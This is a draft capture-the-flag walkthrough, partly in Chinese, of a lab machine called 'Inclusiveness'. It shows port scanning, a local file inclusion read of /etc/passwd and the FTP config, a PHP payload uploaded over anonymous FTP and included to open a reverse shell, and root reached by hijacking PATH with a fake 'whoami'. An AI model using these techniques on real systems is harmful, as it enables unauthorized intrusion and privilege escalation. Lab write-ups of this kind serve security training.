
+++
title = 'Inclusiveness'
date = '2023-12-07T16:08:29+08:00'
draft = true
+++
```
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.189.14
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 17:59 CST
Nmap scan report for 192.168.189.14
Host is up (0.27s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.174
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 061ba39283a57a15bd406e0c8d98277b (RSA)
|   256 cb3883261a9fd35dd3fe9ba1d3bcab2c (ECDSA)
|_  256 6554fc2d12ace184783e0023fbe4c9ee (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Aggressive OS guesses: Linux 4.4 (91%), Linux 3.10 - 3.12 (90%), Linux 4.9 (89%), Linux 4.0 (88%), Linux 3.10 - 3.16 (88%), Linux 3.11 - 4.1 (87%), Linux 2.6.32 (87%), Linux 3.5 (87%), Linux 4.2 (87%), Synology DiskStation Manager 5.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   260.61 ms 192.168.45.1
2   260.69 ms 192.168.45.254
3   261.48 ms 192.168.251.1
4   261.66 ms 192.168.189.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.71 seconds

```

```
===============================================================
2023/05/20 18:23:23 Starting gobuster in directory enumeration mode
===============================================================
http://192.168.189.14/.php                 (Status: 403) [Size: 279]
http://192.168.189.14/manual               (Status: 200) [Size: 626]
http://192.168.189.14/javascript           (Status: 403) [Size: 279]
http://192.168.189.14/robots.txt           (Status: 200) [Size: 59]
```

访问robots.txt,提示不是search engine。尝试下变换user-agent为baidu，可以正常访问了

```
http://192.168.189.14//secret_information/?lang=en.php
```

可能存在本地文件包含，尝试传参../../../../etc/passwd,成功读取到文件

结合ftp匿名传输上传eval.php到/pub/eval.php

通过LFI读取ftp配置

```
http://192.168.189.14//secret_information/?lang=../../../../etc/vsftpd.conf
```

配置文件末尾写了一句

```
 anon_root=/var/ftp/ write_enable=YES # 
```

尝试构造payload，通过文件包含运行刚刚上传的eval.php,同时监听端口接收shell

```
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# nc -lvnp 1234 
listening on [any] 1234 ...
curl 192.168.189.14//secret_information/?lang=/var/ftp/pub/eval.php
```

```
┌──(root💀Chinchin)-[~/桌面/vpn]
└─# nc -lvnp 1234 
listening on [any] 1234 ...
connect to [192.168.45.174] from (UNKNOWN) [192.168.189.14] 41140
Linux inclusiveness 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux
 00:53:49 up 16 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ 
$ which python3
/usr/bin/python3
$ ^?^?python3 -c 'import pty; pty.spawn ("/bin/bash")'
/bin/sh: 4: python3: not found
$ python3 -c 'import pty; pty.spawn ("/bin/bash")'
www-data@inclusiveness:/$ ls  
ls
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
www-data@inclusiveness:/$ cd /home
cd /home
www-data@inclusiveness:/home$ ls
ls
tom
www-data@inclusiveness:/home$ cd tom
cd tom
www-data@inclusiveness:/home/tom$ ls
ls
Desktop    Downloads  Pictures  Templates  local.txt  rootshell.c
Documents  Music      Public    Videos     rootshell
www-data@inclusiveness:/home/tom$ cat local.txt
cat local.txt
0fb779bbe3be4b5dae5413c2969fdc0d

```

```
find / -perm -4000 2>/dev/null
cat rootshell.c
```

```

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
        setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}


```



```
www-data@inclusiveness:/home/tom$ cd /tmp
cd /tmp
www-data@inclusiveness:/tmp$ echo "printf "tom"" > whoami
echo "printf "tom"" > whoami
www-data@inclusiveness:/tmp$ chmod 777 whoami
chmod 777 whoami
www-data@inclusiveness:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
www-data@inclusiveness:/tmp$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@inclusiveness:/tmp$  cd /home/tom
 cd /home/tom
www-data@inclusiveness:/home/tom$ ./rootshell
./rootshell
checking if you are tom...
you are: tom
access granted.
# 

```

